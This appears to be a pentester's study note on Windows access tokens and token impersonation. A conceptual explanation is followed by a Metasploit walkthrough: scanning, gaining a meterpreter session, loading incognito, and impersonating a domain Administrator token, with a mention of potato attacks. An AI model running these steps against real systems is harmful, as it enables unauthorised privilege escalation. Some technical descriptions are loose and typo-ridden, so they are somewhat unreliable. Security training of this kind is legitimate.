Windows Tokens are a core element of the auth process and are created and managed by the Local Security Authority Subsystem Service (LSASS)

A Windows access token is responsible for identifying and describing the security context of a process or threat running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed

Access tokens are generated by the winlogon.exe process every time a user auths sucessfully and includes the identity and privileges of the user account associated with the thread or process. This token is when attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

Windows access tokens are catagorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.

An access token will typically be assigned one of the following security levels:
  Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons
  Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote code access protocols like   RDP
Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token

Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system

The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available

The following are the privileges that are required for a successful impersonation attack:
  SeAssignPrimaryToken: This allows a user to impersonate tokens
  SeCreateToken: This allows a user to create an arbitrary token with admin privileges
  SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with admin privileges
 
Incognito is a built in meterpreter module that was originally a standalone app that allows you to impersonate user tokens after successful exploitation.
We can use the incognito module to display a list of available tokens that we can impersonate

----------------------------------------------------------Exploitation------------------------------------------------------------------------------
nmap <ip>
service postgresql start && msfconsole
search <vulnerability you found>
** exploit and get a reverse tcp or meterpreter session on the targer **
sysinfo
pgrep explorer
migrate 3512
** this may fail **
getuid
getprivs (look for SeImpersonatePrivilege)

load incognito (this will load the module)
list_tokens -u (lists the user / target machine accounts access tokens)
impersonate_token "EXAMPLEDOMAIN\Administrator"
getuid (this will now show elevated privs)
pgrep explorer (the purpose of this is to migrate to a service that has NT\Authority or privileged rights)
migrate 3512
getprivs (this will show an elevated session)
**if you do list_tokens and cannot find any tokens at all here, you will need to do a potato attack**

